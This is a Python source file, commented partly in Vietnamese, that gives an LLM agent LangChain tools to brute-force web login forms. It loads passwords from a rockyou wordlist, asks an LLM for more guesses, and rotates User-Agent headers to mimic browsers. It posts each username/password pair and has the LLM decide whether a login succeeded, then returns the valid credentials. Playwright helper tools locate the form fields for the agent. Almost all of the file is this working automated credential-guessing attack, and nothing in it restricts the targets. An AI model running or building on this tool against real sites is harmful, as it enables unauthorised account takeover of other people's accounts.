import requests
import random
import time
import asyncio
from typing import List, Optional
from langchain.tools import tool
from models.llm import llm
from pydantic import BaseModel
from typing import List, Optional
import ast
from langchain_core.tools import tool
from pydantic import BaseModel

class GoToWebsiteInput(BaseModel):
    url: str

class FindElementInput(BaseModel):
    description: str

class BruteForceInput(BaseModel):
    target_url: str
    usernames: List[str]
    max_passwords: Optional[int] = 100
    param_username_format: str
    param_password_format: str
    param_login_button_format: str
# === User-Agent list để giả lập trình duyệt ===
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64)...",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)...",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:92.0)..."
]

# === Proxy (hiện tại không dùng) ===
PROXIES = [
    None,
    # "http://127.0.0.1:8080",
]

# === Hàm phụ để load password từ file ===
def load_passwords_from_file(path: str, max_lines: Optional[int] = None) -> List[str]:
    """
    Load a list of passwords from a text file (one password per line).
    """
    with open(path, "r", encoding="latin-1", errors="ignore") as f:
        lines = f.readlines()
        if max_lines:
            return [line.strip() for line in lines[:max_lines]]
        return [line.strip() for line in lines]

# === Tool chính để brute-force, gắn @tool cho agent gọi ===
@tool(args_schema=BruteForceInput)
async def bruteforce_with_wordlist_tool(
    target_url: str,
    usernames: List[str],
    param_username_format: str,
    param_password_format: str,
    param_login_button_format: str,
    max_passwords: Optional[int] = 100,
) -> List[str]:
    """
    Try to brute-force login form by testing with a list of usernames.
    I already have a list of common passwords loaded from a file in logic tool, so you don't need to provide a password list.
    Args:
        target_url (str): Login endpoint URL.
        Example: "http://example.com/login".
        usernames (List[str]): List of usernames to try. If only one username is provided, generate the list with only one username. Example: ["admin", "user1", "testuser"].
        max_passwords (Optional[int]): Maximum number of passwords to try. Default is 100.
        param_username_format: get from FindElement tool, which returns the XPath of the username input field. Example "//input[@name='username']".
        param_password_format: get from FindElement tool, which returns the XPath of the password input field. Example "//input[@name='password']".
        param_login_button_format: get from FindElement tool, which returns the XPath of the login button. Default is "Login". Example "//button[@type='submit']".

    Returns:
        List of valid credentials formatted as "username:password".
    """
    import ast
    import random
    import asyncio
    import requests
    from urllib.parse import urlencode
    password_list = load_passwords_from_file("rockyou-25.txt", max_lines=max_passwords)
    valid_creds = []
    for user in usernames[:1]:
        prompt = f"""
        Generate a list of valid passwords for the user '{user}' based on the following password base on top 10 common passwords that you know.
        Return the passwords in a list format like this: ['123456', 'password', '12345678', 'qwerty']
        Do not include any explanations or additional text, just the list of passwords.
        """
        response = await llm.ainvoke(prompt)
        try:
            additional_passwords = ast.literal_eval(response.content.strip())
            if isinstance(additional_passwords, list):
                password_list = list(set(password_list + additional_passwords))
        except Exception as e:
            print(f"[!] Failed to parse password list from LLM: {e}")
        for pw in password_list:
            headers = {
                "User-Agent": random.choice(USER_AGENTS)
            }
            import re
            username_match = re.search(r"@name\s*=\s*['\"]([^'\"]+)['\"]", param_username_format) or \
                 re.search(r"contains\s*\(\s*@name\s*,\s*['\"]([^'\"]+)['\"]\s*\)", param_username_format)
            username_value = username_match.group(1)

            password_match = re.search(r"@name\s*=\s*['\"]([^'\"]+)['\"]", param_password_format) or \
                            re.search(r"contains\s*\(\s*@name\s*,\s*['\"]([^'\"]+)['\"]\s*\)", param_password_format)
            password_value = password_match.group(1) 

            submit_match = re.search(r"@name\s*=\s*['\"]([^'\"]+)['\"]", param_login_button_format) or \
                        re.search(r"contains\s*\(\s*@name\s*,\s*['\"]([^'\"]+)['\"]\s*\)", param_login_button_format)
            submit_value = submit_match.group(1)
            print(f"Submitting with: {username_value}={user}, {password_value}={pw}, {submit_value}={submit_value}")
            dataPost = {f"{username_value}": user, f"{password_value}": pw}
            data = {f"{username_value}": user, f"{password_value}": pw, f"{submit_value}": f"{submit_value}"}
            proxy = {"http": random.choice(PROXIES)} if PROXIES else None

            # Send POST request
            try:
                resp_post = requests.post(target_url, data=dataPost, headers=headers, proxies=proxy, timeout=5)
                post_content = resp_post.text.strip()
            except Exception as e:
                post_content = ""
                print(f"[!] POST error: {e}")

            # Send GET request as fallback
            try:
                full_url = f"{target_url}?{urlencode(data)}"
                print(f"GET URL: {full_url}")
                resp_get = requests.get(full_url, headers=headers, proxies=proxy, timeout=5)
                get_content = resp_get.text.strip()
            except Exception as e:
                get_content = ""
                print(f"[!] GET error: {e}")

            combined_content = post_content + "\n" + get_content
            prompt = f"""
You are analyzing a web login response to determine if it indicates a successful login.

Username: {user}
Password: {pw}
Response HTML: {combined_content}
If the response indicates a failed login, it with contain some keywords like: wrong, incorrect,... Else it is the successful login.
If the login was successful, reply with: Login successful for user: {user}:{pw}
If the login failed, reply with: Login failed for user: {user}:{pw}
Only reply with one line.
"""
            try:
                response = await llm.ainvoke(prompt)
                response_text = response.content.strip().lower()
                print(f"Result: {response_text}")
                if "successful" in response_text:
                    valid_creds.append(f"{user}:{pw}")
                    break
            except Exception as e:
                print(f"[!] LLM error: {e}")

            await asyncio.sleep(0.5)

    return valid_creds

class PlaywrightToolsetAsync:
    def __init__(self, page, llm):
        self.page = page
        self.llm = llm
        self.page_html = None

    async def find_element(self, desc: str) -> str:
        self.page_html = await self.page.content()
        prompt = f"""
You are an automation agent. Your job is to find an XPath to an HTML element, using the full DOM structure below.

### Description:
The user wants to interact with an element described as:
"{desc}"

### DOM (truncated):
{self.page_html}

### Your task:
- Parse the DOM and understand the structure.
- Match the user's vague intent to an element that best fits semantically.
- Match on id, name, placeholder, aria-label, visible text, or associated <label for=...>.
- Avoid relying only on exact text matching.
- Use flexible XPath syntax with contains(...) to allow partial matches.
- The element doesn't have to match the description exactly, but it must exist in the HTML and be the most semantically relevant match.

### Output:
- Only output the XPath string.
- The XPath must work in Playwright with page.locator("xpath=...").
- No explanation, no code block, just the XPath.
"""
        xpath = (await self.llm.ainvoke(prompt)).content.strip()

        # Strip accidental triple-backtick wrapping or language labels
        if xpath.startswith("```"):
            xpath = xpath.strip("`").replace("xpath", "").strip()

        # Optional fallback if LLM fails completely
        if not xpath or len(xpath) < 4:
            return "//input"  # safe fallback
        print(f"Generated XPath for '{desc}': {xpath}")
        return xpath

    async def go_to_website(self, url: str) -> str:
        await self.page.goto(url)
        self.page_html = await self.page.content()
        return f"Visited {url}"


def get_playwright_tools(page, llm):
    toolset = PlaywrightToolsetAsync(page, llm)

    @tool(args_schema=GoToWebsiteInput)
    async def GoToWebsite(url: str) -> str:
        """Go to a specific URL."""
        return await toolset.go_to_website(url)

    @tool(args_schema=FindElementInput)
    async def FindElement(description: str) -> str:
        """Return XPath for given element description."""
        return await toolset.find_element(description)

    return [GoToWebsite, FindElement]
